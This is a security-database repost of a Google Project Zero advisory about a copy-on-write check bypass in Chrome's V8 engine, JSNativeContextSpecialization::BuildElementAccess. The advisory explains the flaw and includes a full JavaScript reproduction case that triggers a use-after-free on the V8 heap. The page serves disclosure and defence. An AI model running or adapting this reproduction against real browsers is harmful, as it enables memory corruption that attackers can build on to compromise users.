---
title: Chrome JSNativeContextSpecialization::BuildElementAccess Bypass
url: https://cxsecurity.com/issue/WLB-2023010034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-21
fetch_date: 2025-10-04T04:27:46.814010
---

# Chrome JSNativeContextSpecialization::BuildElementAccess Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Chrome JSNativeContextSpecialization::BuildElementAccess Bypass** **2023-01-20 / 2023-01-21**  Credit:  **[Google Security Research](https://cxsecurity.com/author/Google%2BSecurity%2BResearch/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Chrome: Copy-on-write check bypass in JSNativeContextSpecialization::BuildElementAccess
VULNERABILITY DETAILS
Copy-on-write is one of V8's internal optimization features that allows multiple JavaScript objects to share the same element store. This feature is primarily used to optimize creation of JavaScript arrays from literals. It's important that every function that can add a new element to a JS object or modify an existing one first checks that the element store isn't marked as COW and makes a copy of the store if needed. Otherwise, the element will be unexpectedly changed for every object that uses the same store.
Consider the implementation of the safety check in `JSNativeContextSpecialization::BuildElementAccess`:
```
JSNativeContextSpecialization::ValueEffectControl
JSNativeContextSpecialization::BuildElementAccess(
Node\* receiver, Node\* index, Node\* value, Node\* effect, Node\* control,
Node\* context, ElementAccessInfo const& access\_info,
KeyedAccessMode const& keyed\_mode) {
[...]
if (keyed\_mode.access\_mode() == AccessMode::kStore &&
IsSmiOrObjectElementsKind(elements\_kind) &&
!IsCOWHandlingStoreMode(keyed\_mode.store\_mode())) {
effect = graph()->NewNode(
simplified()->CheckMaps(
CheckMapsFlag::kNone,
ZoneHandleSet<Map>(factory()->fixed\_array\_map())),
elements, effect, control);
}
[...]
}
```
The `CheckMaps` node is only inserted if the current access mode is `kStore`. However, there are other modes that can also result in storing an element, and one of them is `kDefine`. A call to the `Object.defineProperty` function won't lead to an access in this mode, but an attacker can take advantage of class field initialization to trigger it:
```
function ReturnHolder() { return define\_property\_holder }
class Trigger extends ReturnHolder { 123 = new\_value; }
```
The `Trigger` constructor will perform an element access that's equivalent to the expression `define\_property\_holder[123] = new\_value`, but will set the access mode to `kDefine`, thus bypassing the safety check.
There are likely multiple ways to exploit the issue. The approach the attached reproduction case takes is to create two `PACKED\_SMI\_ELEMENTS` arrays that share the element store and then get one of the arrays to transition to the `PACKED\_ELEMENTS` kind and store a `HeapObject` element. Since copying elements from the corrupted Smi array to another Smi array won't trigger any write barriers, we can hide the pointer from the garbage collector in a new array and trigger a use-after-free on a V8 heap address.
VERSION
V8 version 10.9.0 (candidate)
Google Chrome 107.0.5304.87 (Official Build) (64-bit)
REPRODUCTION CASE
```
function ForceGC() { try { new ArrayBuffer(2 \*\* 34); } catch {} }
old\_space\_array = Array(1, 2);
function CopyElement(from, to) { to[0] = from[0]; } // no write barrier for smi arrays
for (let i = 0; i < 10000; ++i) {
CopyElement(old\_space\_array, old\_space\_array);
}
ForceGC();
function MakeCOW() { return [0]; }
original\_cow\_object = MakeCOW();
function MakeCopy() {
let copy = original\_cow\_object.concat(); // create a new object with COW elements
copy.splice(); // copy the elements
return copy;
}
new\_value = 1;
new\_value = {}; // mark the cell as mutable
function ReturnHolder() { return define\_property\_holder }
class Trigger extends ReturnHolder { 0 = new\_value; }
for (let i = 0; i < 10000; ++i) {
define\_property\_holder = MakeCopy();
new Trigger();
}
new\_value = {};
define\_property\_holder = MakeCOW();
new Trigger();
new\_space\_array = MakeCOW();
new\_space\_array.splice();
CopyElement(new\_space\_array, old\_space\_array);
new\_value = \"\";
define\_property\_holder = MakeCOW();
new Trigger();
new\_space\_array = null;
ForceGC();
console.log(old\_space\_array[0][0]);
```
CREDIT INFORMATION
Sergei Glazunov of Google Project Zero
This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2023-02-06.
Found by: glazunov@google.com

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top